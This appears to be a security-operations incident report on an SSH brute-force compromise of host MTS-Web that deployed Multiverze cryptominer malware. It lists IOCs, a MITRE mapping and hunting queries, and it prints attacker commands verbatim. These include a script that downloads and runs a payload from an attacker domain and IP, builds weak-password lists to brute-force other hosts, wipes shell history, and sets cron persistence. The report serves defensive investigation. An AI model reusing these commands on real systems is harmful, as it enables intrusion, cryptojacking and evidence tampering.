# ID 2356 — Multi-Stage Incident Involving Privilege Escalation on One Endpoint
## ID 2356 PDF Report: https://www.shbelay.com/files/SOC_Reports/ID_2356.pdf
## Findings

| Field | Value |
|---|---|
| **Time** | July 8, 2026 12:59:52 UTC |
| **Host** | MTS-Web (Private: 10.20.0.5 / Public: 165.227.37.172) |
| **IOC IPs** | 8.218.166.49, 85.31.47.99, 10.118.0.193 |
| **IOC Domain** | `dinpasiune[.]com` |
| **IOC Hashes (SHA-256)** | `8473c467adc6d8e79d960df430c3425012ce32b20c6d8ca0116a702790739556`<br>`c1c122869f46aaf8c4e90f3132c93a801c853244c756966952d0bf19241cf084` |
| **Filenames** | `HWfrmnqX`, `retea`, `kuak`, `diicot` |

## Investigation Summary

On July 8, 2026, an attacker successfully connected to host **MTS-Web** via SSH after a brute-force attack. The attacker performed host reconnaissance, staged cryptocurrency mining payloads, attempted to establish persistence, and executed malware associated with the **Multiverze** cryptomining family. Microsoft Defender for Endpoint (MDE) detected and terminated the attempted execution of the malware. There was an unsuccessful attempt at lateral movement and cryptocurrency mining activity; the incident was successfully contained with MDE.

### Who / What / When / Where / Why / How

| | |
|---|---|
| **WHO** | MTS-Web (Private: 10.20.0.5 / Public: 165.227.37.172) |
| **WHAT** | Brute-force attack against MTS-Web; successful authentication with username `ubuntu` |
| **WHEN** | July 8, 2026 12:59:52 PM |
| **WHERE** | MTS-Web (Private: 10.20.0.5 / Public: 165.227.37.172) |
| **WHY** | To use the organization's hardware for a crypto mining campaign |
| **HOW** | Brute-force attack and staging of crypto mining campaigns |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Credential Access | T1110.001 – Password Guessing | SSH brute force |
| Initial Access | T1078 – Valid Accounts | Successful login as `ubuntu` |
| Discovery | T1082 – System Information Discovery | `lspci`, `nvidia-smi` (GPU survey) |
| Discovery | T1087.001 – Local Account Discovery | `/etc/passwd` enumeration for login shells |
| Execution | T1059.004 – Unix Shell | All staged shell scripts |
| Execution | T1053.003 – Cron | Initial cron persistence + later `/var/spool/cron/crontabs/ubuntu` entry |
| Command and Control | T1105 – Ingress Tool Transfer | `scp HWfrmnqX`; `wget`/`curl` payload from `dinpasiune[.]com` |
| Stealth | T1036 – Masquerading | Random filenames (`HWfrmnqX`, `kuak`, `diicot`) |
| Stealth | T1070.004 – File Deletion | `rm -rf .bash_history`, log/artifact cleanup throughout |
| Defense Impairment | T1222.002 – Linux File/Dir Permissions Modification | `chattr -iae` on `authorized_keys` and staged files |
| Persistence | T1098.004 – SSH Authorized Keys | `chattr -iae` on `authorized_keys` specifically enables key tampering |
| Lateral Movement | T1021.004 – Remote Services: SSH | Network binary attempts against internal `10.118.0.x`/`10.20.0.x` hosts |
| Impact | T1496 – Resource Hijacking | CoinMiner execution (`kuak`, `HWfrmnqX`/Multiverze) |

## Recommendations

- Remove cron jobs (`d8c8bff7`/`8fe3ac74`) on MTS-Web host, directory `/var/spool/cron/crontabs/ubuntu`
- Rotate SSH keys and review for any added keys in `~/.ssh/authorized_keys`
- Block listed IOCs (IPs, domains, and hashes) at firewall / EDR

---

## Detailed Analysis

### 1. Brute-Force Attack & Initial Access
**Jul 8, 2026 12:59:52 PM** — Between 12:59 PM and 1:22 PM, the attacker brute-forced their way into MTS-Web. At 1:23 PM, a successful login occurred with username `ubuntu`.

```kql
Auth_CL
| where TimeGenerated <= datetime("2026-07-09")
| where RawData contains "ssh" and RawData contains "8.218.166.49"
```

**Jul 8, 2026 1:23:34 PM** — Unknown IP (`8.218.166.49`) SSH'd into MTS-Web with command line: `sshd: ubuntu@notty`. The IP originates from Hong Kong, HK.

**Virus Total / AbuseIPDB — 8.218.166.49**
<img width="959" height="719" alt="image" src="https://github.com/user-attachments/assets/fcf4e9ac-b9c2-4d7f-b707-68dd792417e0" />
<img width="808" height="631" alt="image" src="https://github.com/user-attachments/assets/2d4f0977-98ec-4abd-b9c7-cfcfc4d11ce7" />


### 2. Host Reconnaissance
**Jul 8, 2026 1:25:04 PM** — Attacker surveyed the system's hardware capabilities to run a crypto mining operation (VGA-compatible controllers, 3D controllers, GPU product name):

```bash
sh -c "lspci | egrep VGA && lspci | grep 3D"
sh -c 'nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' | wc -l | head -c 1'
```

### 3. Payload Staging — HWfrmnqX
**Jul 8, 2026 2:33:49 PM** — Attacker staged malware (`HWfrmnqX`) in `/var/tmp/`:

```bash
scp -qt /var/tmp/HWfrmnqX
```

**Jul 8, 2026 2:33:56 PM** — Attacker ran the following script:

```bash
sh -c "crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak ; chattr -iae /var/tmp/Documents/.diicot ; chattr -iae /var/tmp/.update-logs/History ; chattr -iae /var/tmp/.update-logs/Update ; rm -rf /var/tmp/.update-logs /var/tmp/Documents ; mkdir /var/tmp/Documents > /dev/null 2>&1 ; cd /var/tmp/ ; pkill Opera ; rm -rf /var/tmp/Documents /var/tmp/.update-logs ; rm -rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; cd /var/tmp/ ; chmod 777 HWfrmnqX ; ./HWfrmnqX </dev/null &>/dev/null & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

**Script behavior:**
- Removes all scheduled cron jobs and allows `authorized_keys` to be modified or deleted
- Removes files related to Linux crypto mining (`xmrig`, `cnrig`)
- Creates an executable named `HWfrmnqX` in `/var/tmp/` to run in the background
- Deletes terminal history to remove forensic evidence

**File Reputation — `/var/tmp/HWfrmnqX`** (known malicious file related to crypto mining)
SHA-256: `8473c467adc6d8e79d960df430c3425012ce32b20c6d8ca0116a702790739556`

<img width="875" height="245" alt="image" src="https://github.com/user-attachments/assets/3d261355-9b84-4692-aee2-e16475f7e7ff" />
<img width="975" height="309" alt="image" src="https://github.com/user-attachments/assets/185f9609-3141-44f5-981e-5e6a33aa974a" />


### 4. Malware Execution
**Jul 8, 2026 2:34:27 PM** — `./HWfrmnqX` executed 3 times. The first two times it was detected and blocked by Defender. The third time it successfully ran. The executable was detected as malicious and labeled **Program:Linux/Multiverze!rfn**.

`./HWfrmnqX` started by removing the contents of the following directories:
```bash
rm -rf /var/tmp/cloud-init
rm -rf /var/tmp/systemd-private-fabd791853a14bbaa568167510b5a10f-apache2.service-xWfcUS
```

It then killed any process named `Update`, and deleted the script itself:
```bash
sh -c 'pidof Update | awk '{gsub(" ", "\n", $0); print}' | awk '{print "kill -9 "$1}' > /var/tmp/x.sh ; sh /var/tmp/x.sh ; rm -rf /var/tmp/x.sh /var/tmp/xxx'
```

### 5. Secondary Payload — retea
**Jul 8, 2026 2:34:27 PM** — Defender detected and quarantined malicious file `/dev/shm/retea`. `HWfrmnqX` created this file, labeled **HackTool:Linux/SuspPack.B**.

SHA-256: `c1c122869f46aaf8c4e90f3132c93a801c853244c756966952d0bf19241cf084`

<img width="845" height="225" alt="image" src="https://github.com/user-attachments/assets/685b2df9-17ef-44d9-a681-8dc0f88aa934" />

Attacker ran the following to make `retea` executable in a memory-backed temp directory:
```bash
bash -c "cd /dev/shm ; chmod +x retea ; ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru </dev/null &>/dev/null & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

Then searched `/etc/passwd` for accounts with common login shells:
```bash
grep /bin/bash\|/bin/sh\|/zsh\|/fish /etc/passwd
```

```kql
DeviceProcessEvents
//| where TimeGenerated between (datetime(2026-07-08 00:00:00) .. datetime(2026-07-09 23:59:59))
| where tolower(DeviceName) == "mts-web"
| where ProcessCommandLine contains "crontab"
| sort by TimeGenerated asc
```

**Behavior summary:** The script downloads a payload from `dinpasiune[.]com` and makes it executable, creates a hidden staging directory at `/dev/shm/.x`, and uses a `.network` binary to attempt lateral movement — brute-forcing other systems using usernames/passwords enumerated and collected in `.usrs` and `pass` files, targeting systems listed in `bios.txt`.

**`retea` embedded script (extracted logic):**
```bash
#!/bin/bash
key=$1
user=$2
if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
echo -e ""
else
echo Logged with successfully.
rm -rf .retea
crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget 85.31.47.99/payload || curl -O -s -L 85.31.47.99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history
chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_history
fi
rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999
cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp ips iplist
sleep 1
rm -rf pass
useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`
for us in $(cat $pasus) ; do
  printf "$us $us\n" >> pass
  printf "$us $us"$us"\n" >> pass
  printf "$us "$us"123\n" >> pass
  printf "$us "$us"123456\n" >> pass
  printf "$us 123456\n">> pass
  printf "$us 1\n">> pass
  printf "$us 12\n">> pass
  printf "$us 123\n">> pass
  printf "$us 1234\n">> pass
  printf "$us 12345\n">> pass
  printf "$us 12345678\n">> pass
  printf "$us 123456789\n">> pass
  printf "$us 123.com\n">> pass
  printf "$us 123456.com\n">> pass
  printf "$us 123\n" >> pass
  printf "$us 1qaz@WSX\n" >> pass
  printf "$us "$us"@123\n" >> pass
  printf "$us "$us"@1234\n" >> pass
  printf "$us "$us"@123456\n" >> pass
  printf "$us "$us"123\n" >> pass
  printf "$us "$us"1234\n" >> pass
  printf "$us "$us"123456\n" >> pass
  printf "$us qwer1234\n" >> pass
  printf "$us 111111\n">> pass
  printf "$us qaz123!@#\n" >> pass
  printf "$us !@#\n" >> pass
  printf "$us password\n" >> pass
  printf "$us Huawei@123\n" >> pass
done
wait
sleep 0.5
cat bios.txt | sort -R | uniq | uniq > i
cat i > bios.txt
./network "rm -rf /var/tmp/Documents /tmp/cache ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; cd /tmp/ ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
sleep 25
function Miner {
  rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ; rm -rf ~/.bash_history
  history -c
}
Miner
```

Invocation: `./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru`

**Domain Reputation — `dinpasiune.com`**
<img width="975" height="462" alt="image" src="https://github.com/user-attachments/assets/7b0addaa-9a80-4c34-8fcb-37260bf6d8a2" />


### 6. Lateral Movement & Persistence Cleanup
**Jul 8, 2026 2:34:29 PM** — The `./network` binary executed the following:

```bash
./network "rm -rf /var/tmp/Documents /tmp/cache ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; cd /tmp/ ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

**Behavior breakdown:**
1. **Wipe evidence** — `rm -rf /var/tmp/Documents /tmp/cache`; `mkdir /var/tmp/Documents`
2. **Enable SSH backdoor persistence** — `chattr -iae ~/.ssh/authorized_keys`
3. **Kill competing miners** — `pkill Opera`, `pkill cnrig`, `pkill java`, `killall java`, `pkill xmrig`, `killall cnrig`, `killall xmrig`
4. **Delete cron persistence** — `crontab -r`
5. **Delete logs** — `history -c`; `rm -rf .bash_history ~/.bash_history`
6. **Move malicious payloads into staging directories** — `mv /var/tmp/diicot /var/tmp/Documents/.diicot`; `mv /var/tmp/kuak /var/tmp/Documents/kuak`
7. **Execute malware binaries** (`.diicot` and `cache`) — `/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown`
8. **Erase shell history** — `history -c`; `rm -rf .bash_history ~/.bash_history`

### 7. Attempted Lateral Movement (No Established Connections)
**Jul 8, 2026 2:36:57 PM** — Outbound connection attempts to the following internal IPs; none were established:

```
10.20.0.173     10.20.0.174     10.20.0.255
10.118.0.0      10.118.0.1      10.118.0.73
10.118.0.74     10.118.0.75     10.118.0.132
10.118.0.133    10.118.0.134    10.118.0.144
10.118.0.145    10.118.0.146    10.118.0.147
10.118.0.193    10.118.0.194    10.118.0.195
```

### 8. CoinMiner Detection
**Jul 8, 2026 2:40:24 PM** — Network interacted with file `kuak`. Defender detected **Trojan:Linux/CoinMiner.C12** in file `kuak`.

### 9. Cron-Based Persistence
**Jul 8, 2026 2:40:46 PM** — Attacker established persistence by creating folder path `/var/spool/cron/crontabs/ubuntu` and storing the following script:

```bash
bash -c "echo '@daily /var/tmp/8fe3ac74/./d8c8bff7 > /dev/null 2>&1 & disown
@reboot /var/tmp/8fe3ac74/./d8c8bff7 > /dev/null 2>&1 & disown
* * * * * /var/tmp/8fe3ac74/./d8c8bff7 > /dev/null 2>&1 & disown
@monthly /var/tmp/8fe3ac74/./d8c8bff7 > /dev/null 2>&1 & disown
*/30 * * * * /var/tmp/8fe3ac74/./.c > /dev/null 2>&1 & disown' | crontab -"
```

```kql
DeviceFileEvents
| where TimeGenerated >= datetime("2026-07-08") and TimeGenerated <= datetime("2026-07-09")
| where DeviceId == "78ad7e392d42ead8129673b2f742d2eb77c0f5ab"
```

**File events observed on host (`DeviceFileEvents`):**
<img width="638" height="864" alt="image" src="https://github.com/user-attachments/assets/f7ed193b-2188-496e-a581-17b9d0eed75f" />


### 10. Final Detection & Containment
**Jul 8, 2026 3:24 PM** — An active **CoinMiner** (`Trojan:Linux/CoinMiner.C12`) malware process was detected while executing and was **terminated**.
